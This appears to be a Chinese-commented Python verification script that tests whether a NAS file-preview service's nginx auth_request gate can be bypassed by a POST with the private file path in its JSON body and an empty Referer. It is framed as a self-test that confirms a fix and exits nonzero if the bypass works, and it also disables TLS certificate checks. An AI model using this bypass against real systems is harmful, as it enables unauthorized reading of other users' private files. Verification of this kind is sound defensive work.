#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
POST body 路径绕过 —— 端到端探测（在 NAS 真机上跑）
=====================================================

背景
----
FileView 的正常预览主链路是 **POST**（不是 GET）：
    src/api/index.ts → post(`${apiContext}/localFile`, { srcRelativePath: 原始路径 })
    src/api/index.ts → post(`${apiContext}/status/poll`, { fileId })

而 nginx 的 auth_request 子请求**看不到 POST body**，闸门只能从
`$arg_path` / `$arg_filePath`（query 串）或 Referer 里取路径。
于是「不带 Referer 的 POST」会让闸门落到「未解析到路径 → 放行」。

本脚本在真机上验证这条链路是否真的可被利用。

用法（在 NAS 上，需能访问统一网关；或直接在网关容器所在网络里跑）
------------------------------------------------------------------
    # 0) 先准备：一个「当前用户读不到」的文件路径（可以用另一个用户的私有文件）
    #    以及一个「读得到」的路径做对照
    python3 probe_post_bypass_e2e.py \
        --base https://<你的域名> \
        --cookie "trim_session=<你的登录 Cookie>" \
        --uid 1001 \
        --private /vol2/1000/私密/合同.docx \
        --public  /vol1/1001/我的/公开.docx

    # 只测闸门（不起引擎请求），加 --gate-only

注意：- 需要**合法登录**（统一网关会校验），所以必须带 Cookie。
      - 本脚本只发 HEAD/OPTIONS 之类的探测 + 一次真实 POST，不会下载文件内容。
      - 只应在你自己的设备上、对自己的文件做验证。

退出码：0 = 未能复现绕过（当前判定安全）；1 = 复现了绕过（需要修）。
"""

import argparse
import json
import ssl
import sys
import urllib.error
import urllib.parse
import urllib.request


def req(url, method="GET", headers=None, body=None, timeout=20):
    r = urllib.request.Request(url, data=body, method=method)
    for k, v in (headers or {}).items():
        r.add_header(k, v)
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    try:
        with urllib.request.urlopen(r, timeout=timeout, context=ctx) as resp:
            return resp.status, resp.read(4096).decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, e.read(4096).decode("utf-8", "replace")
    except Exception as e:
        return -1, "ERR: %s" % e


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--base", required=True, help="如 https://nas.example.com")
    ap.add_argument("--cookie", required=True, help="已登录的 Cookie 头")
    ap.add_argument("--uid", default="", help="目标 uid（只用于打印）")
    ap.add_argument("--private", required=True, help="当前用户**读不到**的 /vol 路径")
    ap.add_argument("--public", default="", help="当前用户**读得到**的 /vol 路径（对照）")
    ap.add_argument("--gate-only", action="store_true", help="只探测闸门，不真正请求引擎")
    args = ap.parse_args()

    P = "/app/basemetas-fileview"
    base = args.base.rstrip("/")
    H = {"Cookie": args.cookie}

    print("=" * 76)
    print("POST body 路径绕过 —— 端到端探测")
    print("=" * 76)
    print("base    =", base)
    print("private =", args.private)
    print("public  =", args.public or "(未提供)")
    print()

    findings = []

    # ── 1. 对照：GET 带私有路径（应该在闸门处 403）────────────────────────
    st, body = req("%s%s/preview/view?path=%s" % (base, P, urllib.parse.quote(args.private)),
                   headers=H)
    print("[1] GET  /preview/view?path=<private>")
    print("    → HTTP %s  %s" % (st, body[:120].replace("\n", " ")))
    get_blocked = (st in (401, 403))
    print("    闸门%s" % ("拦下了（对照正常）" if get_blocked else "**没拦**（可能 Cookie 无效或闸门没生效）"))
    findings.append(("GET 对照被拦", get_blocked))
    print()

    # ── 2. 攻击：POST localFile，无 Referer（关键用例）────────────────────
    payload = json.dumps({
        "srcRelativePath": args.private,
        "previewType": "SERVER_FILE",
    }).encode()
    hdr = dict(H)
    hdr["Content-Type"] = "application/json"
    hdr["Referer"] = ""          # 显式清掉；攻击者用 referrerPolicy:no-referrer 也是这个效果
    st, body = req("%s%s/preview/api/localFile" % (base, P), method="POST",
                   headers=hdr, body=payload)
    print("[2] POST /preview/api/localFile  body={srcRelativePath:<private>}  无 Referer")
    print("    → HTTP %s  %s" % (st, body[:200].replace("\n", " ")))
    # 403 = 闸门拦下了；200 = 放行了（绕过）；401 = 登录态问题
    post_bypass = (st == 200)
    print("    → %s" % ("⚠️  200 放行 —— **绕过成立**" if post_bypass
                        else "403/其它 —— 未绕过（%s）" % st))
    findings.append(("POST 无 Referer 被放行", post_bypass))
    print()

    # ── 3. 对照：POST 带「正确来源页」（Referer 里有自己有权读的 path）──
    if args.public:
        hdr2 = dict(H)
        hdr2["Content-Type"] = "application/json"
        hdr2["Referer"] = "%s%s/preview/view?path=%s" % (base, P, urllib.parse.quote(args.public))
        st, body = req("%s%s/preview/api/localFile" % (base, P), method="POST",
                       headers=hdr2, body=payload)
        print("[3] POST /preview/api/localFile  带正确 Referer（正常浏览器流程）")
        print("    → HTTP %s  %s" % (st, body[:200].replace("\n", " ")))
        print("    （这条用来判断「修成 fail-closed 会不会误伤正常流程」：")
        print("     若这里 403 → 说明 Referer 里的 public 路径被拿去判定私密文件，会误拦）")
        print()

    # ── 4. 攻击变体：POST status/poll ─────────────────────────────────────
    payload2 = json.dumps({"fileId": "x"}).encode()
    hdr3 = dict(H)
    hdr3["Content-Type"] = "application/json"
    hdr3["Referer"] = ""
    st, body = req("%s%s/preview/api/status/poll" % (base, P), method="POST",
                   headers=hdr3, body=payload2)
    print("[4] POST /preview/api/status/poll  无 Referer（次要，fileId 无路径）")
    print("    → HTTP %s  %s" % (st, body[:120].replace("\n", " ")))
    print()

    print("=" * 76)
    print("结论")
    print("=" * 76)
    bypassed = any(v for k, v in findings if "无 Referer 被放行" in k)
    if bypassed:
        print("❌ **绕过成立**：POST 无 Referer 时闸门放行，引擎读 body 指定的私有路径。")
        return 1
    print("✅ 本次探测未复现绕过（请确认 Cookie 有效、闸门处于 enforce）。")
    return 0


if __name__ == "__main__":
    sys.exit(main())
